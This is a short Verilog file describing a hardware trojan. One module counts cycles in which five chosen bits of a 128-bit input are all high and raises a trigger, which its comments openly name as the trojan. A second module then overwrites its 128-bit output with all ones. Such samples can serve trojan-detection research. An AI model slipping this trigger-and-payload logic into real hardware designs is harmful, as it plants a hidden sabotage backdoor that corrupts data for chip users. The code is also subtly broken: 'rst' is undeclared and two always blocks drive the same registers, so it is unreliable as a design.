module Novel(
    input clk,
    input [127:0] in,
    output reg out
);
    reg [2:0] EN;
    // if EN = 4, trigger the hardware trojan.

    wire a1 = in[125];
    wire a2 = in[40];
    wire a3 = in[59];
    wire a4 = in[77];
    wire a5 = in[84];

    always @(posedge clk or posedge rst) begin
        if(rst) begin
            EN <= 0;
            out <= 0;
        end
        else if (a1 & a2 & a3 & a4 & a5) begin
            if (EN + 1 == 4) begin
                EN <= 0;
                out <= 1;
            end
            else begin
                EN <= EN + 1;
                out <= 0;
            end

        end else begin
            EN <= 0; // Reset EN if the condition is not met
            out <= 0; // No trojan triggered
        end
    end

    always @(posedge clk) begin
        if (EN == 4) begin
            out <= 1;
            EN <= 0;
        end else begin
            out <= 0; // No trojan triggered
        end
    end

endmodule

module finalEN(
    input clk,
    input trigger,
    input [127:0] in,
    output reg [127:0] out
);
    always @(posedge clk) begin
        if(trigger) begin
            out <= 'hffffffffffffffffffffffffffffffff;
        end
        else begin
            out <= in;
        end
    end
endmodule